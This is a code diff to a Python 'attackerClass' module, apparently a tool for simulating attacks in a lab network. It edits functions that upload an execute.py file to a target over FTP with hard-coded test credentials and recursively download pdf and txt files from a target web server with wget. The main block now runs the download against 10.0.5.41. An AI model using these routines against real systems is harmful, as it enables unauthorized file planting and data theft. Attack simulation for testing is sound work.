@@ -8,6 +8,8 @@ import inspect
 import json
 import random
 from DataAccess import DataAccess,attacker
+import os
+import subprocess
 
 log.basicConfig(filename='attacker.log',level=log.DEBUG)
 
@@ -279,7 +281,7 @@ class attackerClass(object):
 		password ='test1'# args["Pass"]
 
 		try:
-			print("File Creation Being Executed")
+			print("File Being Executed")
 			line = "ftp -p {}".format(ip)
 			file_command = "put {}".format("execute.py")
 			child = pexpect.spawn(line)
@@ -292,7 +294,7 @@ class attackerClass(object):
 			child.expect(">")
 			child.sendline("bye")
 
-			print("File Creation Successfully Executed")
+			print("File Executed Successfully ")
 
 		except Exception as e:
 			print (str(e))
@@ -705,19 +707,22 @@ class attackerClass(object):
 			log.exception(e)
 	
 	@staticmethod
-	def execute_web_dowload_files(args):
+	def execute_web_dowload_files(ip):#(args):
 		'''
 		Use wget to download files directly from webserver
 		'''
-		ip = args["IP"]
+		#ip = args["IP"]
 
 		try:
 			print("Files Being Downloaded")
+			#host = "http://{}/index.php/download-menu".format(ip)
 			command = "wget -R html,htm,php,asp,jsp,js,py,css -r -A pdf,txt -nd http://{}/index.php/download-menu".format(ip)
 			child = pexpect.spawn(command)
-			time.sleep(5)
+			child.expect("$")
+			child.interact()
+
 			print("Files Succesfully Downloaded")
-			child.close()
+
 
 		except Exception as e:
 			print (str(e))
@@ -761,6 +766,7 @@ class attackerClass(object):
 if __name__ == "__main__":
 	object = attackerClass()
 	the_array=object.get_data()
-	object.generate_random_request(the_array)
+	object.execute_web_dowload_files("10.0.5.41")
+	#object.generate_random_request(the_array)
 
 	print('====Execution Complete====')
